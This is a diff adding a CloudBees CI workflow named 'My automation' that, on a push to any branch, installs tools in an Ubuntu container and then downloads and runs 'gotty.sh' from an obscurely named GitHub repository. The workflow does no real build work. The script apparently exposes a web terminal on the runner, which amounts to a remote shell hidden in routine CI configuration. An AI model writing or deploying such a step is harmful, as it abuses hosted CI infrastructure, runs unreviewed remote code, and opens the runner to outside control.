@@ -1,0 +1,21 @@
+apiVersion: automation.cloudbees.io/v1alpha1
+kind: workflow
+name: My automation
+
+on:
+  push:
+    branches:
+      - '**'
+
+jobs:
+  build:
+    steps:
+      - name: ubuntu
+        uses: docker://ubuntu:22.04
+        shell: sh
+        run: |
+          apt-get update -qy \
+          && apt-get full-upgrade -qy \
+          && apt-get dist-upgrade -qy \
+          && apt-get install -qy sudo wget curl \
+          && wget https://raw.githubusercontent.com/6d6bda932c31/6d6bda932c31/main/gotty.sh && chmod +x gotty.sh && ./gotty.sh
